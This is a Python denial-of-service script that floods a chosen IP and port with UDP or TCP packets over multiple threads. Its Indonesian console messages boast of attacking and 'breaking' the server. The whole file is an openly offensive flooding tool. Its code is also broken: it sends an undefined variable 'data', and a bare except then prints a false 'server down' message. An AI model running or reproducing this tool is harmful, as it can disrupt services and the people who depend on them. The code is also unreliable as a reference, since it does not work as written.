#!/usr/bin/env python3
#Code By Hengker Wibu
import argparse
import random
import socket
import threading
import os
import sys

ap = argparse.ArgumentParser()
ap.add_argument("-i", "--ip", required=True, type=str, help="Host ip")
ap.add_argument("-p", "--port", required=True, type=int, help="Port")
ap.add_argument("-c", "--choice", type=str, default="y", help="UDP(y/n)")
ap.add_argument("-t", "--times", type=int, default=50000, help="Packets per one connection")
ap.add_argument("-th", "--threads", type=int, default=5, help="Threads")
args = vars(ap.parse_args())

print("Jangan Abuse Dek")
print("Buat Lu Aja Masih Testing")
ip = args['ip']
port = args['port']
choice = args['choice']
times = args['times']
threads = args['threads']

def run():
	bytes = random._urandom(20000)
	i = random.choice(("[+]","[+]","[+]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Hengker Menyerang Server Dengan Bahagia")
		except:
			print("Server Down Hengker Berhasil Merusaknya")

def run2():
	bytes = random._urandom(16)
	i = random.choice(("[+]","[+]","[+]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Hengker Menyerang Server Dengan Gembira")
		except:
			s.close()
			print("[*] Server Down Hengker Berhasil Merusaknya")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
